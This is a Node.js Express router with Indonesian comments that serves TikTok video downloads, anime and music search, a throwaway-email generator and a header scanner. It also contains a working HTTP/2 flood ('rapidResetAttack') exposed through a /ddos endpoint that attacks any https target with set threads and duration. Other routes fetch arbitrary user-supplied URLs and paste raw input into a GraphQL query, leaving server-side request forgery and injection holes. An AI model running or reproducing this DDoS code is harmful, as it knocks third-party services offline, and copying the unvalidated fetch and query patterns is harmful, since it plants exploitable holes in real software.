const express = require('express');
const router = express.Router();
const axios = require('axios');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const { URL } = require('url');

let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };

router.post('/video', async (req, res) => {
  try {
    const { url } = req.body;
    if (!url) return res.status(400).json({ ok: false, msg: 'Missing url' });
    if (url.includes('tiktok.com')) {
      const r = await axios.post('https://www.tikwm.com/api/', { url, hd: 1 }, { headers: { 'User-Agent': 'Mozilla/5.0' } });
      if (r.data && r.data.code === 0 && r.data.data) {
        let v = r.data.data.play; if (v.startsWith('http://')) v = v.replace('http://', 'https://');
        return res.json({ ok: true, result: { title: r.data.data.title || 'Video', video: v } });
      }
      return res.status(400).json({ ok: false, msg: 'Gagal TikTok.' });
    }
    res.json({ ok: true, url, msg: 'Siap.' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});

// ENDPOINT BARU: UNTUK DOWNLOAD FILE VIDEO DARI SERVER
router.get('/download', async (req, res) => {
  try {
    const { url, filename } = req.query;
    if (!url) return res.status(400).send('URL required');

    // Request video dari server sumber (tikwm) ke server lokal kita
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream',
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    // Set header agar browser otomatis mendownload
    res.setHeader('Content-Disposition', `attachment; filename="${filename || 'video.mp4'}"`);
    res.setHeader('Content-Type', 'video/mp4');

    // Alirkan data video langsung ke browser
    response.data.pipe(res);
  } catch (e) {
    res.status(500).send('Gagal download video.');
  }
});

router.get('/gmail', (req, res) => { res.json({ ok: true, email: `${Math.random().toString(36).substring(7)}@mail.tm`, password: 'pass123' }); });
router.get('/anime', async (req, res) => {
  try {
    const gql = `query { Page(perPage: 10) { media(search: "${req.query.q || 'naruto'}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
    const r = await axios.post('https://graphql.anilist.co', { query: gql });
    res.json({ ok: true, data: r.data.data.Page.media });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});
router.get('/music', async (req, res) => {
  try {
    const r = await axios.get('https://itunes.apple.com/search', { params: { term: req.query.q || 'lofi', media: 'music', limit: 10 } });
    res.json({ ok: true, data: r.data.results });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});
router.post('/scan', async (req, res) => {
  try {
    const r = await axios.get(req.body.url, { timeout: 8000, validateStatus: () => true }).catch(() => ({ status: 408, headers: {} }));
    const f = []; if (!r.headers['content-security-policy']) f.push('No CSP'); if (!r.headers['x-frame-options']) f.push('No XFO');
    res.json({ ok: true, url: req.body.url, status: r.status, findings: f, server: r.headers['server'] || 'Unknown' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});

// DDoS
function rapidResetAttack(targetUrl, stats, io) {
  try {
    const parsed = new URL(targetUrl);
    if (parsed.protocol !== 'https:') return;
    const client = http2.connect(parsed.origin);
    client.on('error', () => {});
    const req = client.request({ ':path': parsed.pathname + '?ovp=' + Math.random().toString(36).substring(7), ':method': 'POST', 'user-agent': 'Mozilla/5.0' });
    let count = 0;
    const interval = setInterval(() => {
      if (client.destroyed || !ddosState.running) { clearInterval(interval); return; }
      req.write('a'.repeat(1000)); count++;
      if (count > 50) { clearInterval(interval); req.close(); client.close(); }
    }, 100);
    req.on('response', () => { stats.success++; io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size }); });
    req.on('error', () => { stats.failed++; client.close(); });
    stats.requests++; stats.activeSockets.add(client);
  } catch (e) { stats.failed++; }
}

router.post('/ddos', async (req, res) => {
  try {
    let { target, duration, threads } = req.body;
    target = target.replace(/[, ]+$/, "");
    if (duration > 120) return res.status(400).json({ ok: false, msg: 'Durasi maks 120!' });
    if (threads > 200) return res.status(400).json({ ok: false, msg: 'Threads maks 200!' });
    if (!target.startsWith('https://')) return res.status(400).json({ ok: false, msg: 'Wajib https://' });
    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS berjalan' });
    const dur = Math.min(Number(duration) || 10, 120);
    const th = Math.min(Number(threads) || 10, 200);
    ddosState = { running: true, target, requests: 0, success: 0, failed: 0, startedAt: Date.now(), activeSockets: new Set() };
    const io = req.app.get('io');
    res.json({ ok: true, msg: 'Started', state: ddosState });
    (async () => {
      const end = Date.now() + dur * 1000;
      while (ddosState.running && Date.now() < end) {
        for (let i = 0; i < th; i++) rapidResetAttack(target, ddosState, io);
        await new Promise(r => setTimeout(r, 50));
      }
      ddosState.running = false;
      io.emit('ddos:done', ddosState);
    })();
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.post('/ddos/stop', (req, res) => {
  if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
  ddosState.running = false;
  ddosState.activeSockets.forEach(sock => { try { sock.destroy(); } catch(e){} });
  ddosState.activeSockets.clear();
  res.json({ ok: true, msg: 'Dihentikan.' });
});

module.exports = router;
